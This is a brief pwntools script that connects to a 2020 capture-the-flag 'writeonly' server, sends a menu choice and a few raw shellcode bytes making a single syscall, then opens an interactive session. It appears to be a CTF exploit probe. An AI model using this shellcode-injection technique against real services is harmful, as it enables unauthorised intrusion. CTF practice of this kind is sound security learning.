from pwn import *

r = remote("writeonly.2020.ctfcompetition.com", 1337)

r.sendline("7")
r.sendline(b"\xb8\x66\x00\x00\x00\x0f\x05")

r.interactive()
